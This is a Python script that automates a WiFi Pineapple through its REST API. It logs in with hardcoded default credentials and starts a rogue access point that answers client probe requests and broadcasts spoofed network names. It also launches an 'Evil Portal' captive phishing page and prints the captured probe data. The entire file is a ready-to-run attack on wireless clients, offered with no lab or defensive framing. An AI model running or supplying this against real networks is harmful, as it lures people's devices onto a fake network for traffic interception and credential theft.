#!/usr/bin/env python3
# ~/hexbox/scripts/pineapple_auto.py
# Automates Pineapple via its REST API

import requests, json, sys

PA = "http://172.16.42.1:1471"
USER, PASS = "root", "hak5pineapple"

def login():
    r = requests.post(f"{PA}/api/login", json={"username":USER,"password":PASS})
    return r.json().get("token")

def api(token, module, action, **kwargs):
    return requests.post(f"{PA}/api/{module}/{action}",
        headers={"Authorization": f"Bearer {token}"}, json=kwargs).json()

if __name__ == "__main__":
    t = login()
    # Start PineAP rogue AP with karma
    api(t, "pineap", "start")
    api(t, "pineap", "settings", **{
        "allow_associations": True,
        "broadcast_ssid_pool": True,
        "respond_to_probes": True,
        "beacon_responses": True,
    })
    # Enable Evil Portal
    api(t, "evilportal", "start", portal="default")
    # Log all probes
    probes = api(t, "pineap", "probes")
    print(json.dumps(probes, indent=2))
